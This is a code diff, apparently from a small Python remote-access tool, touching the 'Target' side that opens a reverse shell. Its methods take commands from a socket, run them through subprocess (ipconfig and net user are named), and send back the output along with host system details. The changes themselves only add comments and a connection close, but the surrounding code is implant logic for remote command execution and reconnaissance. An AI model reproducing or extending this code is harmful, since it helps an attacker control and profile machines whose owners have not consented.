@@ -144,6 +144,7 @@ class Target(Machine):
                 print("Error : " + str(msg))
             self.quit()
 
+    # Shell prompt and send back the result
     def reverse_shell_target(self):
         while True:
             data = self.s.recv(self.buffer)
@@ -170,7 +171,7 @@ class Target(Machine):
                         print(error_msg)
                     self.s.send(str.encode(error_msg))
 
-    # Get information from the target
+    # Get global information from the target
     def getinfo_target_generality(self):
         self.s.send(str.encode("INFORMATION'S TARGET: \n"))
         self.s.send(str.encode("System: " + platform.uname()[0]
@@ -185,6 +186,7 @@ class Target(Machine):
                   + platform.uname()[2] + "\nVersion: " + platform.uname()[3] + "\nMachine: " + platform.uname()[4]
                   + "\nProcessor: " + platform.uname()[5])
 
+    # get some information using the reverse shell. (ipconfig and net user)
     def getinfo_target_cmd(self, command):
         cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
@@ -196,6 +198,7 @@ class Target(Machine):
             print(command)
             print(output_str)
 
+    # define the buffer size
     def change_buffer_size(self):
         self.buffer = int(self.s.recv(self.buffer))
         if self.print:
@@ -206,6 +209,7 @@ class Target(Machine):
         try:
             self.s.send(str.encode("The connection is closing. Say bye to \n\tIP: " + self.information[0] + " \n\tPort "
                                    + str(self.information[1])))
+            self.conn.close()
             super().quit()
         except socket.error as msg:
             if self.print:
